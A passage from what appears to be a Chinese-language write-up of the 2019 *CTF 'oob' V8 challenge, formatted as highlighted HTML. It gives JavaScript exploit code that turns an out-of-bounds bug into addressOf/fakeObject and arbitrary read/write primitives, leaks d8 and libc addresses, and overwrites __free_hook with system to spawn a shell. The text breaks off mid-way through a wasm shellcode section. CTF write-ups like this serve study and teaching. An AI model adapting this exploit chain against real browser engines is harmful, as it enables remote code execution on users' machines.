class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buf =<span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(buf);</span><br><span class="line"><span class="comment">// 浮点数转换为64位无符号整数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f2i</span>(<span class="params">f</span>)</span><br><span class="line">&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为浮点数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">i2f</span>(<span class="params">i</span>)</span><br><span class="line">&#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为16进制字节串</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">i</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> i.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 泄露指定对象的地址</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addressOf</span>(<span class="params">obj_to_leak</span>)&#123;</span><br><span class="line">    obj_array[<span class="number">0</span>] = obj_to_leak;</span><br><span class="line">    obj_array.<span class="title function_">oob</span>(float_array_map);</span><br><span class="line">    <span class="keyword">let</span> addr = <span class="title function_">f2i</span>(obj_array[<span class="number">0</span>])-<span class="number">1n</span>;<span class="comment">//1n是BigNumber</span></span><br><span class="line">    obj_array.<span class="title function_">oob</span>(obj_array_map);</span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着是将给定内存地址伪造为指定<code>JS</code>对象的<code>fakeObject</code>，这里只需要修改<code>MAP</code>值就可以了。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 把某个地址转换为对象</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fakeObject</span>(<span class="params">addr_to_fake</span>)&#123;</span><br><span class="line">    float_array[<span class="number">0</span>] = <span class="title function_">i2f</span>(addr_to_fake+<span class="number">1n</span>);</span><br><span class="line">    <span class="comment">// type(float)--&gt;type(obj)</span></span><br><span class="line">    float_array.<span class="title function_">oob</span>(obj_array_map);</span><br><span class="line">    <span class="keyword">let</span> fake_obj = float_array[<span class="number">0</span>];</span><br><span class="line">    float_array.<span class="title function_">oob</span>(float_array_map);</span><br><span class="line">    <span class="keyword">return</span> fake_obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里需要注意的是<code>V8</code>会给对象的内存地址<code>+1</code>，因此我们获取得到的对象地址需要<code>-1</code>，在写入是需要将内存地址<code>+1</code>。</p><h3 id="获取任意内存读写"><a href="#获取任意内存读写" class="headerlink" title="获取任意内存读写"></a>获取任意内存读写</h3><p>如何凭借上面两个函数实现内存的任意读写呢。如果我们在一块内存区域内布置上伪造的数据结构，通过<code>fakeObject</code>将其强制转换为一个数组对象，由于<code>elements</code>指针是我们可控的，如果我们将该指针修改为我们想要访问的内存地址，后续对该数组对象的访问即为对修改后的内存地址指向的内存区域的访问，也就实现了内存的任意读写。</p><p>具体的构造如下，首先我们先创建一个浮点类型的数组对象<code>float_array</code>，可以用<code>addressOf</code>函数来泄露<code>float_array</code>的地址，然后通过<code>elements</code>地址与<code>fake_array</code>结构地址之前的关系即<code>address_elements = address_array - (0x10 + n*8)</code>，其中<code>n</code>为数组中元素的个数，既可以到的<code>elements</code>的地址。<code>elements+0x10</code>是<code>elements</code>中存储数据的区域。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fake_array = [</span><br><span class="line">    float_array_map,<span class="comment">//fake to be a float arr object</span></span><br><span class="line">    <span class="title function_">i2f</span>(<span class="number">0n</span>),</span><br><span class="line">    <span class="title function_">i2f</span>(<span class="number">0x41414141n</span>),<span class="comment">//fake obj&#x27;s elements ptr</span></span><br><span class="line">    <span class="title function_">i2f</span>(<span class="number">0x1000000000n</span>),</span><br><span class="line">    <span class="number">1.1</span>,</span><br><span class="line">    <span class="number">2.2</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>在得到<code>elements+0x10</code>即数据存储区域的地址之后可以利用<code>fakeObject</code>将该部分的内存区域强制转换为对象<code>fake_object</code>，之后我们访问对象<code>fake_object[0]</code>即访问的就是<code>0x41414141+0x10</code>指向的内存地址。任意内存读写的功能原语如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fake_array = [</span><br><span class="line">    float_array_map,</span><br><span class="line">    <span class="title function_">i2f</span>(<span class="number">0n</span>),</span><br><span class="line">    <span class="title function_">i2f</span>(<span class="number">0x41414141n</span>),<span class="comment">//fake obj&#x27;s elements ptr</span></span><br><span class="line">    <span class="title function_">i2f</span>(<span class="number">0x1000000000n</span>),</span><br><span class="line">    <span class="number">1.1</span>,</span><br><span class="line">    <span class="number">2.2</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_arr_addr = <span class="title function_">addressOf</span>(fake_array);</span><br><span class="line"><span class="keyword">var</span> fake_object_addr = fake_arr_addr - <span class="number">0x40n</span> + <span class="number">0x10n</span>;</span><br><span class="line"><span class="keyword">var</span> fake_object = <span class="title function_">fakeObject</span>(fake_object_addr);</span><br><span class="line"></span><br><span class="line"><span class="comment">//randomRead</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">read64</span>(<span class="params">addr</span>)</span><br><span class="line">&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = <span class="title function_">i2f</span>(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    <span class="keyword">let</span> leak_data = <span class="title function_">f2i</span>(fake_object[<span class="number">0</span>]);</span><br><span class="line">    <span class="comment">//console.log(&quot;[*] leak from: 0x&quot; +hex(addr) + &quot;: 0x&quot; + hex(leak_data));</span></span><br><span class="line">    <span class="keyword">return</span> leak_data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write64</span>(<span class="params">addr,data</span>)</span><br><span class="line">&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = <span class="title function_">i2f</span>(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    fake_object[<span class="number">0</span>] = <span class="title function_">i2f</span>(data);</span><br><span class="line">    <span class="comment">//console.log(&quot;[*] write to : 0x&quot; +hex(addr) + &quot;: 0x&quot; + hex(data));</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试一下代码发现已经可以任意读写</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/V8-%E9%87%8D%E6%96%B0%E5%85%A5%E9%97%A8-2019-starCTF-oob-%E9%A2%98%E8%A7%A3/20200805115702.png" alt="图片无法显示，请联系作者" title=" "><p>由于后续写入利用浮点类型数组写入会导致地址的低位被修改而无法正常写入，还可以利用<code>DataView</code>对象。<code>DataView</code>对象的<code>backing_store</code>会指向申请的<code>data_buf</code>，将该指针修改为我们想要任意写的内存地址，利用<code>setBigUint64</code>方法即可写入数据</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> data_buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(data_buf);</span><br><span class="line"><span class="keyword">var</span> buf_backing_store_addr = <span class="title function_">addressOf</span>(data_buf) + <span class="number">0x20n</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">writeDataview</span>(<span class="params">addr,data</span>)&#123;</span><br><span class="line">    <span class="title function_">write64</span>(buf_backing_store_addr,addr);</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>,data,<span class="literal">true</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] write to : 0x&quot;</span> +<span class="title function_">hex</span>(addr) + <span class="string">&quot;: 0x&quot;</span> + <span class="title function_">hex</span>(data));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h2><p>在传统的<code>pwn</code>中我们通过泄露出<code>libc</code>基址，计算出<code>free_hook,malloc_hook</code>，利用任意写将<code>hook</code>函数修改为<code>system,one_gadget</code>的地址从而实现<code>getshell</code>。这种思路在<code>v8</code>中也同样可以使用</p><p>此外，<code>v8</code>中还有一种<code>webassembly</code>即<code>wasm</code>技术，使得<code>v8</code>可以直接执行其他高级语言生成的机器码，加快运行效率，存储<code>wasm</code>的内存页是<code>rwx</code>权限的，因此我们可以将<code>shellcode</code>写入到原本属于<code>wasm</code>的内存页中，后续在调用<code>wasm</code>函数接口的时候，实际上就是调用了我们部署的<code>shellcode</code>。</p><h3 id="传统的堆利用思路"><a href="#传统的堆利用思路" class="headerlink" title="传统的堆利用思路"></a>传统的堆利用思路</h3><p>现在已经实现了内存任意写，后面就是泄露<code>libc</code>地址了。</p><h4 id="随机泄露"><a href="#随机泄露" class="headerlink" title="随机泄露"></a>随机泄露</h4><p>我们用<code>telescope</code>查看<code>JS</code>对象很远的内存区域</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope 0x000008d78aa0f9c0-0x8000 0x500</span><br><span class="line">00:0000│   0x8d78aa079c0 —▸ 0x2fd70f04a4b9 ◂— 0x7100002beee20c04</span><br><span class="line">01:0008│   0x8d78aa079c8 —▸ 0x2fd70f04a4f1 ◂— 0x7100002beee20c04</span><br><span class="line">02:0010│   0x8d78aa079d0 —▸ 0x2fd70f04a529 ◂— 0x7100002beee20c04</span><br><span class="line">03:0018│   0x8d78aa079d8 —▸ 0x2fd70f04a561 ◂— 0x7100002beee20c04</span><br><span class="line">...</span><br><span class="line">4ab:2558│   0x8d78aa09f18 —▸ 0x555555eebe40 ◂— push   rbp <span class="comment"># d8中的指令</span></span><br><span class="line">4ac:2560│   0x8d78aa09f20 —▸ 0x2b619e680b71 ◂— 0x200002b619e6801</span><br><span class="line">4ad:2568│   0x8d78aa09f28 —▸ 0x555555eebe40 ◂— push   rbp</span><br><span class="line"></span><br><span class="line">pwndbg&gt; vmmap 0x555555eebe40</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    0x5555557e7000     0x5555562af000 r-xp   ac8000 293000 /home/pwn/Desktop/v8/v8-<span class="built_in">source</span>/v8/out.gn/x64.release/d8 +0x704e40</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/2gx 0x555555eebe40</span><br><span class="line">0x555555eebe40 &lt;v8::(anonymous namespace)::WebAssemblyCompile(v8::FunctionCallbackInfo&lt;v8::Value&gt; const&amp;)&gt;:0x56415741e58948550xec81485354415541</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在距离<code>JS</code>对象很远内存区域中一定会存在<code>d8 binary</code>中的指令。而无论<code>ASLR</code>带来的地址如何随机化，其低地址的三个字节一定是<code>0xe40</code>，地址中存储的内容也一定会是<code>0x56415741e5894855</code>。</p><p>因此只要我们从<code>JS</code>对象的起始地址向低地址处搜索，每次读取<code>8</code>字节内容，如果低<code>3</code>字节的内容为<code>0xe40</code>，且该地址处存储的内容为<code>0x56415741e5894855</code>，则判断该地址即为<code>d8</code>中指令的地址了。获取地址的代码如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line"><span class="keyword">var</span> start_addr = <span class="title function_">addressOf</span>(a);</span><br><span class="line"><span class="keyword">var</span> leak_d8_addr = <span class="number">0n</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    start_addr -= <span class="number">0x8n</span>;</span><br><span class="line">    leak_d8_addr = <span class="title function_">read64</span>(start_addr);</span><br><span class="line">    <span class="keyword">if</span>((leak_d8_addr &amp; <span class="number">0xfffn</span>) == <span class="number">0x05b0n</span> &amp;&amp; <span class="title function_">read64</span>(leak_d8_addr) == <span class="number">0x56415741e5894855n</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] Success find leak_d8_addr: 0x&quot;</span> + <span class="title function_">hex</span>(leak_d8_addr));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] Done.&quot;</span>);</span><br></pre></td></tr></table></figure><p>运行结果如下</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/V8-%E9%87%8D%E6%96%B0%E5%85%A5%E9%97%A8-2019-starCTF-oob-%E9%A2%98%E8%A7%A3/20200805124949.png" alt="图片无法显示，请联系作者" title=" "><p>那么在获取得到<code>d8</code>的指令地址之后，我们就可以计算出<code>d8</code>的基址，读取<code>got</code>表中的<code>malloc,free</code>的地址获取<code>libc</code>基址，覆盖<code>free_hook/malloc_hook</code>为<code>system/one_gadget</code>即可以<code>getshell</code>。需要注意的是这里借助<code>DataView</code>实现地址写入。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// libc2.31</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> d8_base_addr = leak_d8_addr - <span class="number">0x997e40n</span>;</span><br><span class="line"><span class="keyword">var</span> d8_got_libc_start_main_addr = d8_base_addr + <span class="number">0xd98730n</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] d8_got_libc_start_main_addr: 0x&quot;</span> + <span class="title function_">hex</span>(d8_got_libc_start_main_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> libc_start_main_addr = <span class="title function_">read64</span>(d8_got_libc_start_main_addr);</span><br><span class="line"><span class="keyword">var</span> libc_base_addr = libc_start_main_addr - <span class="number">0x26fc0n</span>;</span><br><span class="line"><span class="keyword">var</span> libc_system_addr = libc_base_addr + <span class="number">0x55410n</span>;</span><br><span class="line"><span class="keyword">var</span> libc_free_hook_addr = libc_base_addr + <span class="number">0x1eeb28n</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] find libc addr: 0x&quot;</span> + <span class="title function_">hex</span>(libc_base_addr));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] find libc system address: 0x&quot;</span> + <span class="title function_">hex</span>(libc_system_addr));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] find libc libc_free_hook_addr: 0x&quot;</span> + <span class="title function_">hex</span>(libc_free_hook_addr));</span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">writeDataview</span>(libc_free_hook_addr, libc_system_addr);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] Write ok.&quot;</span>);</span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br></pre></td></tr></table></figure><p>由于<code>v8</code>在退出的时候会进行各种各样的<code>free</code>操作，因此一定会触发<code>free</code>。但是此时参数是不可控的，因此我们需要申请一个局部<code>buffer</code>，然后释放从而触发<code>free</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">get_shell</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">let</span> get_shell_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">let</span> get_shell_dataview = <span class="keyword">new</span> <span class="title class_">DataView</span>(get_shell_buffer);</span><br><span class="line">    get_shell_dataview.<span class="title function_">setFloat64</span>(<span class="number">0</span>, <span class="title function_">i2f</span>(<span class="number">0x0068732f6e69622fn</span>)); <span class="comment">// str --&gt; /bin/sh\x00 </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">get_shell</span>();</span><br></pre></td></tr></table></figure><p>最终可以成功<code>getshell</code></p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/V8-%E9%87%8D%E6%96%B0%E5%85%A5%E9%97%A8-2019-starCTF-oob-%E9%A2%98%E8%A7%A3/20200805131615.png" alt="图片无法显示，请联系作者" title=" "><h4 id="稳定泄露"><a href="#稳定泄露" class="headerlink" title="稳定泄露"></a>稳定泄露</h4><p>在<code>dbug</code>版本中<code>Array-&gt;MAP-&gt;constructor-&gt;code</code>内存的固定偏移处存储了<code>v8</code>二进制中特定的函数调用</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/V8-%E9%87%8D%E6%96%B0%E5%85%A5%E9%97%A8-2019-starCTF-oob-%E9%A2%98%E8%A7%A3/20200805142654.png" alt="图片无法显示，请联系作者" title=" "><p>我们看到存在一个<code>Builtins_ArrayConstructor</code>函数的调用。在<code>debug</code>版本中，该函数的地址位于<code>libv8.so</code>中。而在<code>release</code>版本中，在调试中发现<code>MAP</code>结构中并没有存储<code>constructor</code>的地址，而是在数据结构<code>+0x28</code>位置。</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/V8-%E9%87%8D%E6%96%B0%E5%85%A5%E9%97%A8-2019-starCTF-oob-%E9%A2%98%E8%A7%A3/20200805143347.png" alt="图片无法显示，请联系作者" title=" "><p>我们看到<code>release</code>版本中存储的<code>Builtins_ArrayConstructor</code>函数调用位于<code>d8</code>中，因此我们就可以泄露出<code>d8</code>中的指令的地址，之后的<code>getshell</code>与随机泄露中相同。</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/V8-%E9%87%8D%E6%96%B0%E5%85%A5%E9%97%A8-2019-starCTF-oob-%E9%A2%98%E8%A7%A3/20200805143522.png" alt="图片无法显示，请联系作者" title=" "><p><code>getshell</code>的脚本如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//libc2.31</span></span><br><span class="line"><span class="keyword">var</span> a = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line"><span class="comment">//%DebugPrint(a);</span></span><br><span class="line"><span class="keyword">var</span> code_addr = <span class="title function_">read64</span>(<span class="title function_">addressOf</span>(a.<span class="property">constructor</span>) + <span class="number">0x30n</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] find addressOf(a.constructor): 0x&quot;</span> + <span class="title function_">hex</span>(<span class="title function_">addressOf</span>(a.<span class="property">constructor</span>)));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] find code addr: 0x&quot;</span> + <span class="title function_">hex</span>(code_addr));</span><br><span class="line"><span class="keyword">var</span> leak_d8_addr = <span class="title function_">read64</span>(code_addr + <span class="number">0x41n</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] find libc leak_d8_addr: 0x&quot;</span> + <span class="title function_">hex</span>(leak_d8_addr));</span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] Done.&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//var d8_base_addr = leak_d8_addr - 0x997e40n;</span></span><br><span class="line"><span class="keyword">var</span> d8_base_addr = leak_d8_addr - <span class="number">0xad54e0n</span>;</span><br><span class="line"><span class="keyword">var</span> d8_got_libc_start_main_addr = d8_base_addr + <span class="number">0xd98730n</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] d8_got_libc_start_main_addr: 0x&quot;</span> + <span class="title function_">hex</span>(d8_got_libc_start_main_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> libc_start_main_addr = <span class="title function_">read64</span>(d8_got_libc_start_main_addr);</span><br><span class="line"><span class="keyword">var</span> libc_base_addr = libc_start_main_addr - <span class="number">0x26fc0n</span>;</span><br><span class="line"><span class="keyword">var</span> libc_system_addr = libc_base_addr + <span class="number">0x55410n</span>;</span><br><span class="line"><span class="keyword">var</span> libc_free_hook_addr = libc_base_addr + <span class="number">0x1eeb28n</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] find libc addr: 0x&quot;</span> + <span class="title function_">hex</span>(libc_base_addr));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] find libc system address: 0x&quot;</span> + <span class="title function_">hex</span>(libc_system_addr));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] find libc libc_free_hook_addr: 0x&quot;</span> + <span class="title function_">hex</span>(libc_free_hook_addr));</span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">writeDataview</span>(libc_free_hook_addr, libc_system_addr);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] Write ok.&quot;</span>);</span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">get_shell</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">let</span> get_shell_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">let</span> get_shell_dataview = <span class="keyword">new</span> <span class="title class_">DataView</span>(get_shell_buffer);</span><br><span class="line">    get_shell_dataview.<span class="title function_">setFloat64</span>(<span class="number">0</span>, <span class="title function_">i2f</span>(<span class="number">0x0068732f6e69622fn</span>)); <span class="comment">// str --&gt; /bin/sh\x00 </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">get_shell</span>();</span><br></pre></td></tr></table></figure><p>最终<code>getshell</code></p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/V8-%E9%87%8D%E6%96%B0%E5%85%A5%E9%97%A8-2019-starCTF-oob-%E9%A2%98%E8%A7%A3/20200805143736.png" alt="图片无法显示，请联系作者" title=" "><h3 id="wasm-Getshell"><a href="#wasm-Getshell" class="headerlink" title="wasm Getshell"></a>wasm Getshell</h3><p><code>wasm</code>从安全性上不允许通过浏览器直接调用系统函数，只能运行数学计算，图像处理等系统无关的高级语言代码。因此我们需要将原来<code>wasm</code>可执行内存空间中的代码替换为<code>shellcode</code>，进而执行。</p><p>可以从这个<a href="https://wasdk.github.io/WasmFiddle/">网站</a>在线生成<code>wasm</code>的代码，调试的代码如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span 